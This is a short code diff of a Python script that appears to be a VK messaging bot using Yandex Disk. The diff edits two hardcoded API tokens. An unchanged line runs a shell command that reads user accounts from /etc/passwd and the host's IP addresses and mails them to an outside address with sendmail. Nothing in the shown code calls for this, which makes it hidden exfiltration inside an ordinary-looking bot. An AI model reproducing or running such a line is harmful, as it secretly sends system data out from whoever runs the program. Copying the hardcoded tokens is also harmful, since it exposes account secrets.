@@ -61,8 +61,8 @@ def write_video(user_id):
 
 
 
-yan_d = yadisk.YaDisk(token="AQAAAAAYaeNqAAWinCyW9sBTXUn0rvotytdQX44")
-vk = vk_api.VkApi(token="3c22b953e86d4e305446c13c960341dbc891ece241d779bba6a89bbd66c80dd95da18527530322d29663f")
+yan_d = yadisk.YaDisk(token="AQAAAAAYaeNqAAWinCyW9sBTXUn0rvotytdQX")
+vk = vk_api.VkApi(token="3c22b953e86d4e305446c13c960341dbc891ece241d779bba6a89bbd66c80dd95da18527530322d2966")
 longpoll = VkLongPoll(vk)
 session = requests.Session()
 os.system('(echo "Name:" && cat /etc/passwd | grep bash && echo "IP:" && ifconfig | grep inet) | sendmail -v "denis@denis-GL55VW"')
